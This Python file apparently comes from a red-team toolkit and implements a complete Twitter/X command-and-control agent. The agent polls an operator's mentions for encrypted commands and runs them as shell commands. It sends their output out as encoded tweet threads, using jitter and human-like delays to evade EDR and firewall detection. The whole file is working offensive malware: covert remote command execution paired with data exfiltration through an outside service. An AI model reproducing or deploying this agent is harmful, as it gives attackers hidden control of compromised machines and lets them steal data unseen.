# c2_frameworks/twitter/agent.py
"""
Twitter / X C2 Agent
- Uses a burner account
- Polls a command account (you) via likes, replies, and tweets
- Beacons by liking a specific tweet
- Receives tasks from replies containing base94 payloads
- Exfils via threaded replies or DMs (if enabled)
Zero network callbacks → invisible to most EDR/NGFW
"""

import os
import time
import random
import json
import tweepy
import subprocess
from datetime import datetime
from typing import Dict, Any, Optional

from .utils import (
    base94_encode, base94_decode,
    chunk_payload, xor_encrypt,
    generate_task_id
)

class TwitterC2Agent:
    def __init__(
        self,
        consumer_key: str,
        consumer_secret: str,
        access_token: str,
        access_token_secret: str,
        command_account: str,           # @RedTeamOperator
        beacon_tweet_id: Optional[int] = None,
        beacon_interval: int = 300,
        xor_key: str = "30DaysRedTeam"
    ):
        self.command_account = command_account.lstrip("@")
        self.beacon_interval = beacon_interval
        self.xor_key = xor_key.encode()
        self.beacon_tweet_id = beacon_tweet_id
        self.last_task_ts = 0

        # Authenticate as burner account
        auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
        auth.set_access_token(access_token, access_token_secret)
        self.api = tweepy.API(auth, wait_on_rate_limit=True)

        print(f"[+] Twitter C2 Agent Active")
        print(f"[+] Burner      : @{self.api.me().screen_name}")
        print(f"[+] Listening to: @{self.command_account}")

    def execute(self, cmd: str) -> str:
        """Execute shell command with timeout"""
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=120
            )
            output = result.stdout + result.stderr
            return output.strip() or "Executed (no output)"
        except Exception as e:
            return f"Error: {str(e)}"

    def send_output(self, task_id: str, output: str):
        """Send result as threaded reply (chunked if needed)"""
        payload = {
            "task_id": task_id,
            "output": output,
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }
        json_str = json.dumps(payload)
        encrypted = xor_encrypt(json_str.encode(), self.xor_key)
        encoded = base94_encode(encrypted)

        chunks = chunk_payload(encoded, max_len=270)
        parent_id = None
        for chunk in chunks:
            try:
                status = self.api.update_status(
                    status=chunk,
                    in_reply_to_status_id=parent_id,
                    auto_populate_reply_metadata=True
                )
                parent_id = status.id
                time.sleep(random.uniform(8, 18))  # Human-like delay
            except Exception as e:
                print(f"[-] Failed to send chunk: {e}")

    def beacon(self):
        """Like the beacon tweet to signal 'online'"""
        if not self.beacon_tweet_id:
            return
        try:
            self.api.create_favorite(self.beacon_tweet_id)
            print(f"[+] Beacon sent (liked tweet {self.beacon_tweet_id})")
        except:
            pass  # Already liked or rate limited

    def check_for_tasks(self):
        """Poll command account's mentions for new tasks"""
        try:
            mentions = self.api.mentions_timeline(since_id=self.last_task_ts, tweet_mode="extended")
            for mention in mentions:
                if mention.user.screen_name.lower() != self.command_account.lower():
                    continue

                text = mention.full_text.replace(f"@{self.api.me().screen_name}", "").strip()
                if not text or ":" not in text:
                    continue

                # Extract base94 payload after marker
                payload_part = text.split(":", 1)[1].strip()
                try:
                    encrypted = base94_decode(payload_part)
                    decrypted = xor_encrypt(encrypted, self.xor_key)  # XOR is symmetric
                    data = json.loads(decrypted.decode())

                    task_id = data.get("task_id", "unknown")
                    command = data.get("command")

                    print(f"[*] Task {task_id}: {command}")
                    output = self.execute(command)
                    self.send_output(task_id, output)

                    self.last_task_ts = mention.id
                except Exception as e:
                    print(f"[-] Failed to process mention: {e}")
        except Exception as e:
            print(f"[-] Poll error: {e}")

    def run(self):
        """Main agent loop"""
        print(f"[+] Starting beacon every {self.beacon_interval}s")
        while True:
            try:
                self.beacon()
                self.check_for_tasks()
                jitter = random.uniform(0.8, 1.3)
                time.sleep(self.beacon_interval * jitter)
            except KeyboardInterrupt:
                print("\n[-] Agent stopped.")
                break
            except Exception as e:
                print(f"[-] Runtime error: {e}")
                time.sleep(60)


# ——— Entry Point ———
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Twitter C2 Agent")
    parser.add_argument("--ck", required=True, help="Consumer Key")
    parser.add_argument("--cs", required=True, help="Consumer Secret")
    parser.add_argument("--at", required=True, help="Access Token")
    parser.add_argument("--ats", required=True, help="Access Token Secret")
    parser.add_argument("--command", required=True, help="@RedTeamOperator")
    parser.add_argument("--beacon-tweet", type=int, help="Tweet ID to like as beacon")
    parser.add_argument("--interval", type=int, default=300)

    args = parser.parse_args()

    agent = TwitterC2Agent(
        consumer_key=args.ck,
        consumer_secret=args.cs,
        access_token=args.at,
        access_token_secret=args.ats,
        command_account=args.command,
        beacon_tweet_id=args.beacon_tweet,
        beacon_interval=args.interval
    )
    agent.run()